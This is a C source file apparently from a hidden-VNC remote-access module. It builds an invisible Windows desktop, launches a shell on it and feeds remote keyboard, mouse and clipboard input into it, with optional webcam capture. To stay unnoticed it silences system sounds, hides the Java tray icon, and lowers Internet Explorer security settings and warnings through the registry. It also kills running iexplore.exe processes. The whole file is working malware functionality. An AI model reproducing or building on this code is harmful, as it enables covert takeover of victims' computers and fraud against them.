#include "..\includes.h"
#include "..\webcam\webcam.h"
#include "windows.h"
#include "dib.h"
#include "sshot.h"
#include "events.h"
#include "kbd.h"
#include "mou.h"
#include "taskswitcher.h"
#include "layoutswitcher.h"
#include "wnd_watcher.h"
#include "vnc_func.h"
#include "vnc.h"
#include "cpu_limit.h"
#include "..\hvnc.h"

bool IsThereActiveClients(PHVNC lpServer)
{
    if (lpServer->DeskInfo.bWebCam)
        return true;

    bool bRet=false;
    DWORD dwTime=GetTickCount();

    rfbClientIteratorPtr i=rfbGetClientIteratorWithClosed(lpServer->rfbScreen);
    rfbClientPtr cl=rfbClientIteratorHead(i);
    while (cl)
    {
        HVNC_SHORT_CLIENT_INFO *lpClientInfo=(HVNC_SHORT_CLIENT_INFO *)cl->clientData;
        if (lpClientInfo)
        {
            bool bViewOnly=false;
            if (lpClientInfo->piPassword.dwFlags & VNC_FLAG_VIEWONLY)
                bViewOnly=true;

            if ((bViewOnly) || ((dwTime-lpClientInfo->dwLastKbdInputTime < MAX_IDLE_TIME/2) || (dwTime-lpClientInfo->dwLastMouInputTime < MAX_IDLE_TIME/2)))
            {
                bRet=true;
                break;
            }
        }
        cl=rfbClientIteratorNext(i);
    }
    return bRet;
}

void CALLBACK ScreenUpdateThread(PHVNC lpServer)
{
    lpServer->bUpdateThreadStarted=true;
    SetThreadDesktopEx(lpServer->hDesktop);
    InitOurDCs(lpServer);

    bool bDeep=true;
    DWORD dwIteration=6;

    int dwIdleCount=0;
	while (WaitForSingleObject(lpServer->EventsInfo.hVNCKillEvent,0) == WAIT_TIMEOUT)
	{
        if ((lpServer->EventsInfo.dwClients) && (IsThereActiveClients(lpServer)))
        {
            if ((lpServer->DeskInfo.bWebCam) || (GetTopWindow(NULL)))
            {
                if (!(lpServer->DeskInfo.dwFlags & HVNC_NO_CPU_LIMITS))
                {
                    if ((bSlowPC) && (bCpuSleep))
                    {
                        if (dwIdleCount++ > MAX_IDLE_COUNT)
                        {
                            lpServer->bCpuSleep=false;
                            dwIdleCount=0;
                        }
                        else
                            lpServer->bCpuSleep=true;
                    }
                }

                if ((!IsPCSlow(lpServer)) || (!lpServer->bCpuSleep))
                {
                    g_enter(hPaintMutex)
                        MakeSShot(lpServer);
                    g_leave(hPaintMutex)
                }

                if ((dwIteration > 5) || (lpServer->DeskInfo.dwFlags & HVNC_NO_CPU_LIMITS))
                {
                    dwIteration=0;
                    bDeep=true;
                }

                g_enter(hPaintMutex)
                    FastDetectChanges(lpServer,bDeep);
                g_leave(hPaintMutex)

                dwIteration++;
                bDeep=false;
            }
            Sleep(lpServer->EventsInfo.dwSleep);
        }
        else
            Sleep(RFB_SLEEP_TIME);
	}
	lpServer->bUpdateThreadStarted=false;
	return;
}

void OnKeyboardEvent(rfbBool downflag,rfbKeySym key,rfbClientPtr cl)
{
    PHVNC lpServer=(PHVNC)cl->screen->screenData;
    if (lpServer->DeskInfo.bWebCam)
        return;

    if (cl->clientData)
    {
        HVNC_SHORT_CLIENT_INFO *lpClient=(HVNC_SHORT_CLIENT_INFO *)cl->clientData;
        lpClient->dwLastKbdInputTime=GetTickCount();
    }

    ProcessKbdMsg(cl,key,downflag);
    return;
}

void OnPointerEvent(int buttonMask,int x,int y,rfbClientPtr cl)
{
    PHVNC lpServer=(PHVNC)cl->screen->screenData;
    if (lpServer->DeskInfo.bWebCam)
        return;

    if (cl->clientData)
    {
        HVNC_SHORT_CLIENT_INFO *lpClient=(HVNC_SHORT_CLIENT_INFO *)cl->clientData;
        lpClient->dwLastMouInputTime=GetTickCount();
    }

    EVENT_POINTER ep;
    ep.wXPos=x;
    ep.wYPos=y;
    ep.bButtonMask=(byte)buttonMask;
    DWORD dwWheel=0,
    dwFlags=MOUSEEVENTF_ABSOLUTE;
    bool bSwapped=GetSystemMetrics(SM_SWAPBUTTON) ? true:false;

    if ((ep.wXPos != lpServer->EventsInfo.epLast.wXPos) || (ep.wYPos != lpServer->EventsInfo.epLast.wYPos))
        dwFlags|=MOUSEEVENTF_MOVE;

    if ((ep.bButtonMask & MASK_POINTER_BUTTON_LEFT) != (lpServer->EventsInfo.epLast.bButtonMask & MASK_POINTER_BUTTON_LEFT))
    {
        if (ep.bButtonMask & MASK_POINTER_BUTTON_LEFT)
            dwFlags|=bSwapped ? MOUSEEVENTF_RIGHTDOWN:MOUSEEVENTF_LEFTDOWN;
        else
            dwFlags|=bSwapped ? MOUSEEVENTF_RIGHTUP:MOUSEEVENTF_LEFTUP;
    }

    if ((ep.bButtonMask & MASK_POINTER_BUTTON_RIGHT) != (lpServer->EventsInfo.epLast.bButtonMask & MASK_POINTER_BUTTON_RIGHT))
    {
        if (ep.bButtonMask & MASK_POINTER_BUTTON_RIGHT)
            dwFlags|=bSwapped ? MOUSEEVENTF_LEFTDOWN:MOUSEEVENTF_RIGHTDOWN;
        else
            dwFlags|=bSwapped ? MOUSEEVENTF_LEFTUP:MOUSEEVENTF_RIGHTUP;
    }

    if ((ep.bButtonMask & MASK_POINTER_BUTTON_MIDDLE) != (lpServer->EventsInfo.epLast.bButtonMask & MASK_POINTER_BUTTON_MIDDLE))
        dwFlags|=(ep.bButtonMask & MASK_POINTER_BUTTON_MIDDLE) ? MOUSEEVENTF_MIDDLEDOWN:MOUSEEVENTF_MIDDLEUP;

    if (ep.bButtonMask & MASK_POINTER_WHEEL_UP)
    {
        dwFlags|=MOUSEEVENTF_WHEEL;
        dwWheel=WHEEL_DELTA;
    }

    if (ep.bButtonMask & MASK_POINTER_WHEEL_DOWN)
    {
        dwFlags|=MOUSEEVENTF_WHEEL;
        dwWheel=(DWORD)(-WHEEL_DELTA);
    }

    memcpy(&lpServer->EventsInfo.epLast,&ep,sizeof(EVENT_POINTER));
    if (lpServer->DeskInfo.bInputDesktop)
    {
        DWORD dwX=(ep.wXPos*65535)/(lpServer->DeskInfo.dwWidth-1),
              dwY=(ep.wYPos*65535)/(lpServer->DeskInfo.dwHeight-1);
        mouse_event(dwFlags,dwX,dwY,dwWheel,0);
        GetCursorPos(&lpServer->lpGlobalVNCData->ptCursor);
    }
    else
        ProcessMouMsg(lpServer,dwFlags,ep.wXPos,ep.wYPos,dwWheel);
    rfbDefaultPtrAddEvent(buttonMask,x,y,cl);
    return;
}

void OnReceiveClipboard(char* str,int len,_rfbClientRec* cl)
{
    PHVNC lpServer=(PHVNC)cl->screen->screenData;
    if (lpServer->DeskInfo.bWebCam)
        return;

	g_enter(hInputMutex)
	{
		if (len >= sizeof(lpServer->lpGlobalVNCData->ClipboardData))
			len=sizeof(lpServer->lpGlobalVNCData->ClipboardData)-1;

		int nNewLines=0;
		for (int i=0; i < len; i++)
        {
			if (str[i] == '\n')
                nNewLines++;
        }

		char *lpClipboard=str;
		if (nNewLines)
		{
			lpClipboard=(char*)MemAlloc(len+nNewLines);
			for (int i=0, j=0; i < len; i++)
			{
				if (str[i] == '\n')
				{
					lpClipboard[j++]='\r';
					lpClipboard[j++]='\n';
				}
				else
					lpClipboard[j++]=str[i];
			}
			len+=nNewLines;
		}

        MultiByteToWideChar(CP_ACP,MB_PRECOMPOSED,lpClipboard,len,lpServer->lpGlobalVNCData->ClipboardData,sizeof(lpServer->lpGlobalVNCData->ClipboardData)/sizeof(TCHAR));
        lpServer->lpGlobalVNCData->ClipboardData[len]=0;
        lpServer->lpGlobalVNCData->dwClipboardDataSize=len+1;

        if (lpClipboard != str)
            MemFree(lpClipboard);

        if (lpServer->DeskInfo.bInputDesktop)
        {
            if (OpenClipboard(NULL))
            {
                EmptyClipboard();
                HGLOBAL hMem=GlobalAlloc(GMEM_MOVEABLE,(len+nNewLines+1)*sizeof(WCHAR));
                WCHAR *lpMem=(WCHAR *)GlobalLock(hMem);
                lstrcpyW(lpMem,lpServer->lpGlobalVNCData->ClipboardData);
                GlobalUnlock(hMem);
                SetClipboardData(CF_UNICODETEXT,hMem);
                GlobalFree(hMem);
                CloseClipboard();
            }
        }
	}
    g_leave(hInputMutex)
    return;
}

void ClientGone(rfbClientPtr cl)
{
    PHVNC lpServer=(PHVNC)cl->screen->screenData;
    lpServer->EventsInfo.dwClients--;
    if (!lpServer->EventsInfo.dwClients)
    {
        if (lpServer->DeskInfo.bWebCam)
#ifdef _HVNC_WEBCAM
            CamStopCapture(lpServer);
#else
            ;
#endif
        else if (lpServer->TaskSwitcherInfo.bTaskSwitcherIsShown)
        {
            DestroyTaskSwitcherWnd(lpServer,false);
            g_enter(hPaintMutex)
            {
                MakeSShot(lpServer);
                FastDetectChanges(lpServer,true);
            }
            g_leave(hPaintMutex)
        }
    }

    if (lpServer->lpClientGoneHook)
    {
        HVNC_CLIENT_INFO ClientInfo={0};
        ClientInfo.hVNC=GetHVNC(lpServer);
        ClientInfo.bGone=true;
        HVNC_SHORT_CLIENT_INFO *lpShortInfo=(HVNC_SHORT_CLIENT_INFO *)cl->clientData;
        memcpy(&ClientInfo.saClient,&lpShortInfo->saClient,sizeof(ClientInfo.saClient));
        memcpy(&ClientInfo.piPassword,&lpShortInfo->piPassword,sizeof(ClientInfo.piPassword));
        lpServer->lpClientGoneHook(&ClientInfo);
    }

    if (cl->clientData)
        MemFree(cl->clientData);
    return;
}

TCHAR szToolBar[]=_T("ToolbarWindow32");
SOUNDSENTRY seInfo={sizeof(seInfo)};
SPI_INFO siInfo[]={{SPI_SETMENUANIMATION,NULL},
                   {SPI_SETSHOWSOUNDS,NULL},
                   {SPI_SETSOUNDSENTRY,&seInfo},
                   {SPI_SETFOREGROUNDLOCKTIMEOUT,(LPVOID)1},
                   {SPI_SETFOREGROUNDFLASHCOUNT,(LPVOID)1},
                   {SPI_SETBEEP,NULL},
                   {SPI_SETCOMBOBOXANIMATION,NULL},
                   {SPI_SETTOOLTIPANIMATION,NULL},
                   {SPI_SETSELECTIONFADE,NULL},
                   {SPI_SETLISTBOXSMOOTHSCROLLING,NULL},
                   {SPI_SETHOTTRACKING,NULL},
                   {SPI_SETGRADIENTCAPTIONS,NULL},
                   {SPI_SETCLIENTAREAANIMATION,NULL},
                   {SPI_SETDISABLEOVERLAPPEDCONTENT,NULL}};
rfbBool NewClientAction(rfbClientPtr cl)
{
    PHVNC lpServer=(PHVNC)cl->screen->screenData;
    cl->clientGoneHook=ClientGone;
    lpServer->EventsInfo.dwClients++;

    if (!cl->clientData)
        cl->clientData=MemAlloc(sizeof(HVNC_SHORT_CLIENT_INFO));
    HVNC_SHORT_CLIENT_INFO *lpClientInfo=(HVNC_SHORT_CLIENT_INFO *)cl->clientData;
    lpClientInfo->dwLastKbdInputTime=lpClientInfo->dwLastMouInputTime=GetTickCount();

    if (lpServer->DeskInfo.bWebCam)
#ifdef _HVNC_WEBCAM
        CamStartCapture(lpServer);
#else
        ;
#endif
    else if ((!lpServer->hDesktop) || (!lpServer->dwExplorersPID) || (!IsProcess(lpServer->dwExplorersPID)))
    {
        lpServer->hDesktop=CreateDesktopA(lpServer->DeskInfo.szDeskName,NULL,NULL,DF_ALLOWOTHERACCOUNTHOOK,GENERIC_ALL,NULL);

        if (!lpServer->hDesktop)
            return FALSE;

        SetThreadDesktopEx(lpServer->hDesktop);
        lpServer->WndsInfo.hDeskWnd=GetDesktopWindow();

        if (!(lpServer->DeskInfo.dwFlags & HVNC_USE_BITBLT))
            StartWatcher(lpServer);

        PROCESS_INFORMATION piInfo={0};
        if (!(lpServer->DeskInfo.dwFlags & HVNC_NO_SHELL))
        {
            STARTUPINFOA siInfo={0};
            siInfo.cb=sizeof(siInfo);
            siInfo.lpDesktop=lpServer->DeskInfo.szDeskName;
            if (!CreateProcessA(lpServer->Names.szShell,NULL,NULL,NULL,false,0,NULL,NULL,&siInfo,&piInfo))
                return FALSE;
            lpServer->lpGlobalVNCData->dwExplorersPID=lpServer->dwExplorersPID=piInfo.dwProcessId;
        }

        while (!lpServer->WndsInfo.hTrayWnd)
            lpServer->WndsInfo.hTrayWnd=FindWnd(NULL,_T("Shell_TrayWnd"),NULL);

        lpServer->WndsInfo.hTakSwRebarWnd=FindWnd(lpServer->WndsInfo.hTrayWnd,_T("ReBarWindow32"),NULL);
        lpServer->WndsInfo.hTakSwWnd=FindWnd(lpServer->WndsInfo.hTakSwRebarWnd,_T("MSTaskSwWClass"),NULL);
        lpServer->WndsInfo.hToolBarWnd=FindWnd(lpServer->WndsInfo.hTakSwWnd,szToolBar,NULL);
        lpServer->WndsInfo.hMSTaskListWnd=FindWnd(lpServer->WndsInfo.hTakSwWnd,_T("MSTaskListWClass"),NULL);
        lpServer->WndsInfo.hTrayNotifyWnd=FindWnd(lpServer->WndsInfo.hTrayWnd,_T("TrayNotifyWnd"),NULL);
        lpServer->WndsInfo.hTraySystemNotifyToolbarWnd=FindWnd(lpServer->WndsInfo.hTrayNotifyWnd,szToolBar,NULL);
        lpServer->WndsInfo.hSysPagerWnd=FindWnd(lpServer->WndsInfo.hTrayNotifyWnd,_T("SysPager"),NULL);
        lpServer->WndsInfo.hTrayUserNotifyToolbarWnd=FindWnd(lpServer->WndsInfo.hSysPagerWnd,szToolBar,NULL);
        lpServer->WndsInfo.hOverflowIconWindow=FindWnd(NULL,_T("NotifyIconOverflowWindow"),NULL);
        lpServer->WndsInfo.hTrayUserNotifyOverflowToolbarWnd=FindWnd(lpServer->WndsInfo.hOverflowIconWindow,szToolBar,NULL);

        if (!(lpServer->DeskInfo.dwFlags & HVNC_NO_SHELL))
        {
            StartLayoutSwitcher(lpServer);

            SysCloseHandle(piInfo.hThread);
            SysCloseHandle(piInfo.hProcess);
        }

        if (!bXP)
            lpServer->WndsInfo.hStartBtnWnd=FindWnd(NULL,_T("button"),NULL);
        else
            lpServer->WndsInfo.hStartBtnWnd=GetWindow(lpServer->WndsInfo.hTrayWnd,GW_CHILD);

        lpServer->WndsInfo.hProgmanWnd=FindWnd(NULL,_T("Progman"),_T("Program Manager"));
        lpServer->WndsInfo.hDefView=FindWnd(lpServer->WndsInfo.hProgmanWnd,_T("SHELLDLL_DefView"),NULL);
        lpServer->WndsInfo.hDeskListView=FindWnd(lpServer->WndsInfo.hDefView,_T("SysListView32"),_T("FolderView"));

        int i=0;
        while (!(lpServer->WndsInfo.hShellWnd=GetShellWindow()))
        {
            if (i++ > 500)
                break;
            Sleep(10);
        }

        lpServer->MouStateInfo.hLastDownWindow=NULL;
        lpServer->MouStateInfo.dwLastDownMessage=0;
        lpServer->MouStateInfo.dwLastDownTime=0;

        if (!(lpServer->DeskInfo.dwFlags & HVNC_DONT_DISABLE_EFFECTS))
        {
            for (int i=0; i < countof(siInfo); i++)
                SystemParametersInfo(siInfo[i].uiAction,0,siInfo[i].pvParam,SPIF_SENDCHANGE);
            ChangePowerCfg();
            EnableSystemSounds(false);
        }

        if (!(lpServer->DeskInfo.dwFlags & HVNC_DONT_HIDE_JAVA_ICON))
        {
            for (int i=18; i <= 38; i++)
            {
                TCHAR szBuf[300];
                wsprintf(szBuf,_T("SOFTWARE\\JavaSoft\\Java Plug-in\\1.6.0_%d"),i);

                HKEY hKey;
                if (!RegOpenKeyEx(HKEY_LOCAL_MACHINE,szBuf,0,KEY_WOW64_64KEY+KEY_ALL_ACCESS,&hKey))
                {
                    DWORD dwOne=0;
                    RegSetValueEx(hKey,_T("HideSystemTrayIcon"),0,REG_DWORD,(BYTE*)&dwOne,sizeof(dwOne));
                    RegCloseKey(hKey);
                }
            }
        }

        if (!(lpServer->DeskInfo.dwFlags & HVNC_DONT_DISABLE_IE_SAFEMODE))
        {
            IE_SHIT IEShit[]={{_T("1609"),0},
                              {_T("1802"),0},
                              {_T("1803"),0},
                              {_T("1806"),0},
                              {_T("1807"),0},
                              {_T("1808"),0},
                              {_T("2500"),3}};
            HKEY hKey;
            for (int x=0; x < 2; x++)
            {
                HKEY hRootKey=(x) ? HKEY_CURRENT_USER : HKEY_LOCAL_MACHINE;
                for (int i=0; i <= 4; i++)
                {
                    TCHAR szBuf[300];
                    wsprintf(szBuf,_T("Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\%d"),i);
                    if (!RegOpenKeyEx(hRootKey,szBuf,0,KEY_WOW64_64KEY+KEY_ALL_ACCESS,&hKey))
                    {
                        for (int j=0; j < countof(IEShit); j++)
                            RegSetValueEx(hKey,IEShit[j].lpName,0,REG_DWORD,(BYTE*)&IEShit[j].dwValue,sizeof(DWORD));
                        RegCloseKey(hKey);
                    }
                }

                if (!RegOpenKeyEx(hRootKey,_T("Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings"),0,KEY_WOW64_64KEY+KEY_ALL_ACCESS,&hKey))
                {
                    DWORD dwDisable=0;
                    RegSetValueEx(hKey,_T("WarnOnIntranet"),0,REG_DWORD,(BYTE*)&dwDisable,sizeof(dwDisable));
                    RegCloseKey(hKey);
                }

                if (!RegOpenKeyEx(hRootKey,_T("Software\\Microsoft\\Internet Explorer\\Main"),0,KEY_WOW64_64KEY+KEY_ALL_ACCESS,&hKey))
                {
                    DWORD dwEnabled=1;
                    RegSetValueEx(hKey,_T("NoProtectedModeBanner"),0,REG_DWORD,(BYTE*)&dwEnabled,sizeof(dwEnabled));
                    RegCloseKey(hKey);
                }
            }

            DWORD dwIDs[4096]={0},dwRet=0,dwPID=GetCurrentProcessId();
            EnumProcesses(dwIDs,sizeof(dwIDs),&dwRet);

            for (DWORD i=0; i < (dwRet/sizeof(DWORD)); i++)
            {
                if (dwIDs[i] == dwPID)
                    continue;

                HANDLE hProc=OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwIDs[i]);
                if (hProc)
                {
                    TCHAR szName[MAX_PATH];
                    GetProcessImageFileName(hProc,szName,sizeof(szName)/sizeof(szName[0])-1);
                    if (StrStrI(szName,_T("iexplore.exe")))
                        TerminateProcess(hProc,0);
                    CloseHandle(hProc);
                }
            }
        }

        if (!(lpServer->DeskInfo.dwFlags & HVNC_USE_BITBLT))
        {
            HWND hWnd=GetWindow(GetWindow(lpServer->WndsInfo.hDeskWnd,GW_CHILD),GW_HWNDLAST);
            do
                AppendWndToList(lpServer,hWnd);
            while (hWnd=GetWindow(hWnd,GW_HWNDPREV));

            SetForegroundWnd(lpServer,lpServer->WndsInfo.hTrayWnd);
        }
    }
    if (!lpServer->bUpdateThreadStarted)
        SysCreateThread(lpServer,(LPTHREAD_START_ROUTINE)ScreenUpdateThread,lpServer,true);

    if (lpServer->lpNewClientHook)
    {
        HVNC_CLIENT_INFO ClientInfo={0};
        ClientInfo.hVNC=GetHVNC(lpServer);
        int dwSize=sizeof(ClientInfo.saClient);
        getpeername(cl->sock,(sockaddr*)&ClientInfo.saClient,&dwSize);
        HVNC_SHORT_CLIENT_INFO *lpShortInfo=(HVNC_SHORT_CLIENT_INFO *)cl->clientData;
        memcpy(&lpShortInfo->saClient,&ClientInfo.saClient,sizeof(ClientInfo.saClient));
        memcpy(&ClientInfo.piPassword,&lpShortInfo->piPassword,sizeof(ClientInfo.piPassword));
        lpServer->lpNewClientHook(&ClientInfo);
    }
    return TRUE;
}

rfbBool OnNewClientAuth(rfbClientPtr cl,const char* response,int len)
{
    PASSWORD_ITEM **passwds=(PASSWORD_ITEM**)cl->screen->authPasswdData;
    for (int i=0; passwds[i]; i++)
    {
        uint8_t auth_tmp[CHALLENGESIZE];
        memcpy((char *)auth_tmp,(char *)cl->authChallenge,CHALLENGESIZE);
        rfbEncryptBytes(auth_tmp,passwds[i]->szPassword);

        if (!memcmp(auth_tmp,response,len))
        {
            if (!((PHVNC)cl->screen->screenData)->DeskInfo.bWebCam)
            {
                int dwFlags=passwds[i]->dwFlags;
                cl->viewOnly=(dwFlags & VNC_FLAG_VIEWONLY) ? TRUE : FALSE;
                cl->allowClipboard=(dwFlags & VNC_FLAG_ALLOWCLIPBOARD) ? TRUE : FALSE;
                cl->permitFileTranfer=(dwFlags & VNC_FLAG_ALLOWFILETRANSFER) ? TRUE : FALSE;
            }
            else
            {
                cl->permitFileTranfer=TRUE;
                cl->allowClipboard=TRUE;
                cl->viewOnly=FALSE;
            }
            if (!(((PHVNC)cl->screen->screenData)->DeskInfo.dwFlags & HVNC_NO_VNC_CURSOR))
                cl->enableCursorPosUpdates=false;

            cl->clientData=MemAlloc(sizeof(HVNC_SHORT_CLIENT_INFO));
            PASSWORD_ITEM *lpPassword=&((HVNC_SHORT_CLIENT_INFO*)cl->clientData)->piPassword;
            lstrcpyA(lpPassword->szPassword,passwds[i]->szPassword);
            lpPassword->dwFlags=passwds[i]->dwFlags;
            return NewClientAction(cl);
        }
    }
    return FALSE;
}

enum rfbNewClientAction OnNewClient(rfbClientPtr cl)
{
    if (!((PHVNC)cl->screen->screenData)->DeskInfo.bWebCam)
    {
        cl->permitFileTranfer=TRUE;
        cl->allowClipboard=TRUE;
        cl->viewOnly=FALSE;
    }
    else
    {
        cl->permitFileTranfer=FALSE;
        cl->allowClipboard=FALSE;
        cl->viewOnly=TRUE;
    }
    if (!(((PHVNC)cl->screen->screenData)->DeskInfo.dwFlags & HVNC_NO_VNC_CURSOR))
        cl->enableCursorPosUpdates=false;
    return (NewClientAction(cl)) ? RFB_CLIENT_ACCEPT:RFB_CLIENT_REFUSE;
}

void SendClipboard(PHVNC lpServer)
{
	g_enter(hInputMutex)
    {
        if (lpServer->DeskInfo.bInputDesktop)
        {
            if (IsClipboardFormatAvailable(CF_UNICODETEXT))
            {
                OpenClipboard(NULL);
                HGLOBAL hMem=GetClipboardData(CF_UNICODETEXT);
                if (hMem)
                {
                    WCHAR *lpMem=(WCHAR*)GlobalLock(hMem);
                    if (lpMem)
                    {
                        lstrcpyW(lpServer->lpGlobalVNCData->ClipboardData,lpMem);
                        lpServer->lpGlobalVNCData->dwClipboardDataSize=lstrlenW(lpServer->lpGlobalVNCData->ClipboardData);
                        GlobalUnlock(hMem);
                    }
                }
                CloseClipboard();
            }
            else
                lpServer->lpGlobalVNCData->dwClipboardDataSize=0;
        }

        if (lpServer->lpGlobalVNCData->dwClipboardDataSize > 0)
        {
            char *lpClipboard=(char*)MemAlloc(lpServer->lpGlobalVNCData->dwClipboardDataSize);
            WideCharToMultiByte(1251,WC_COMPOSITECHECK,lpServer->lpGlobalVNCData->ClipboardData,-1,(LPSTR)lpClipboard,lpServer->lpGlobalVNCData->dwClipboardDataSize,NULL,NULL);
            rfbSendServerCutText(lpServer->rfbScreen,lpClipboard,lpServer->lpGlobalVNCData->dwClipboardDataSize);
            MemFree(lpClipboard);
        }
        else
            rfbSendServerCutText(lpServer->rfbScreen,NULL,0);
    }
	g_leave(hInputMutex)
	return;
}

int OnFileTransfer(rfbClientPtr cl)
{
    return (cl->permitFileTranfer) ? TRUE : FALSE;
}

bool SendThreadMessageTimeout(PHVNC lpServer,DWORD dwID,DWORD dwMsg,DWORD dwParam,DWORD dwTimeOut)
{
    bool bRet=false;
    HANDLE hThread=OpenThread(THREAD_QUERY_INFORMATION,false,dwID);
    if (hThread)
    {
        DWORD dwCode=0;
        if ((GetExitCodeThread(hThread,&dwCode)) && (dwCode == STILL_ACTIVE))
        {
            SetEvent(lpServer->EventsInfo.hSendThreadMessageEvent);
            PostThreadMessage(dwID,lpServer->lpGlobalVNCData->dwVNCMessage,dwMsg,dwParam);
            if (WaitForSingleObject(lpServer->EventsInfo.hSendThreadMessageEvent,dwTimeOut) == WAIT_OBJECT_0)
                bRet=true;
        }
        SysCloseHandle(hThread);
    }
    return bRet;
}

void NotifyAllProcess(PHVNC lpServer,DWORD dwMsg,DWORD dwParam)
{
    HDESK hDesk=GetThreadDesktop(GetCurrentThreadId());
    SetThreadDesktopEx(lpServer->hDesktop);
    g_enter(hSendThreadMessageMutex)
    {
        THREADITEM *lpIDs=lpServer->lpGlobalVNCData->dwIDs;
        while (lpIDs->dwId)
        {
            SendThreadMessage(lpServer,lpIDs->dwId,dwMsg,dwParam);
            lpIDs++;
        }
    }
    g_leave(hSendThreadMessageMutex)
    SetThreadDesktop(hDesk);
    return;
}

